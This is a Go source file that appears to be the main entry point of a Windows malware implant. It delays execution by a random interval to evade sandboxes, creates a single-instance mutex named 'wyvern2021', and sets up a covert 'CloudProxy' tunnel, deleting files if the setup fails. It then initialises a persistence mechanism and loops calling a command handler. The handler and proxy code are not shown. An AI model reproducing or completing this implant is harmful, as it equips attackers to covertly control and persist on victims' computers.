package main

import (
	crand "crypto/rand"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"os"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
	if _, err := CreateMutex("wyvern2021"); err != nil {
		return
	}

	for {
		err := SetupCloudProxy()
		if err == nil {
			break
		}
		err = os.RemoveAll(os.Getenv("public") + "\\netsh")
		if err != nil {
			os.Exit(0)
		}
	}
	errorChan := make(chan error)
	readyChan := make(chan bool)
	go CloudProxy(readyChan, errorChan)
	go func(errChan <-chan error) {
		for {
			err := <- errChan
			if err != nil {
				os.Exit(0)
			}
		}
	}(errorChan)
	<- readyChan
	time.Sleep(time.Second * 3)

	var config Config
	var persistence Persistence
	err := config.Init()
	if err != nil {
		os.Exit(0)
	}
	err = persistence.Init(config)
	if err != nil {
		os.Exit(0)
	}
	for {
		err = mainFunc(config)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 10)
	}
}

func CreateMutex(name string) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32.NewProc("CreateMutexW")
	ptrName, err := syscall.UTF16PtrFromString(name)
	if err != nil {
		return 0, err
	}
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(ptrName)),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func mainFunc(config Config) error {
	var handler Handler
	err := handler.Init(config)
	return err
}
